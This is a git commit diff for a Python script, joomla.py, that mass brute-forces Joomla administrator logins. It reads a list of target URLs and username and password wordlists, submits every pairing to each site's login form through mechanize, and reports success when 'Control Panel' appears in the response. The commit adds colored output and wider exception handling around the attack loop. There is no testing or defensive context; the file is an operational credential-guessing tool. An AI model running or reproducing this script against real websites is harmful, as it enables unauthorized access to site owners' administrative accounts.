f8cb8b298790c2a4a2fe817f36d059fffccbfcc5
s3fg <m.alobaid@hotmail.com>
2017-04-03 11:41:47 +0100

    fixed other errors while opening page + added colors

--- joomla.py
+++ joomla.py
@@ -10,9 +10,9 @@ error = ["Username and password do not match or you do not have an account yet."
 sussuc = "Control Panel"
 br = mechanize.Browser()
 br.set_handle_robots(False)
-fopen = open("/root/PycharmProjects/untitled/project/scanner/t.txt", "r")
-username = open("/root/PycharmProjects/untitled/project/scanner/username.txt", "r")
-passw = open("/root/PycharmProjects/untitled/project/scanner/password.txt", "r")
+fopen = open("/root/scanner/t.txt", "r")
+username = open("/root/scanner/username.txt", "r")
+passw = open("/root/scanner/password.txt", "r")
 
 userlist = username.readlines()
 passlist = passw.readlines()
@@ -28,44 +28,49 @@ for line in fopen.readlines():
 
     try:
         page = br.open(line.strip(), timeout=5)
-        print "URL OPENED"
+        print "\033[1;37;42m URL OPENED"
 
     except:
-        print "Error ocurred"
+        print "\033[1;37;41m Error ocurred"
         pass
 
+    try:
+        for form in br.forms():
 
-    for form in br.forms():
+            # try:
 
-        # try:
+            for u in userlist:
+                if logged == False:
+                    for p in passlist:
+                        try:
+                            br.select_form(nr=0)
+                            print "trying user: %s and password: %s" % (u, p)
+                            br.form["username"] = u
+                            br.form["passwd"] = p
+                            br.submit()
+                            readingPage = br.response().read()
+                            if sussuc in readingPage:
+                                logged = True
+                                print "succefully loggen in!\n ---------------------------------"
+                            else:
+                                print "Wrong credentials\n ----------------------------------------"
+                        except:
+                            pass
 
-        for u in userlist:
-            if logged == False:
-                for p in passlist:
-
-                    br.select_form(nr=0)
-                    print "trying user: %s and password: %s" % (u, p)
-                    br.form["username"] = u
-                    br.form["passwd"] = p
-                    br.submit()
-                    readingPage = br.response().read()
-                    if sussuc in readingPage:
-                        logged = True
-                        print "succefully loggen in!\n ---------------------------------"
-                    else:
-                        print "Wrong credentials\n ----------------------------------------"
-                    # for i in error:
-                    #     if i in readingPage:
-                    #         print "wrong credential"
-                    #     # elif sussuc in readingPage:
-                    #     else:
-                    #         logged = True
-                    #         print "success"
+                        # for i in error:
+                        #     if i in readingPage:
+                        #         print "wrong credential"
+                        #     # elif sussuc in readingPage:
+                        #     else:
+                        #         logged = True
+                        #         print "success"
 
 
-        # except:
-        #          print "I'm out of the loop"
-        # pass
+            # except:
+            #          print "I'm out of the loop"
+            # pass
+    except:
+        pass
 passw.close()
 username.close()
 fopen.close()
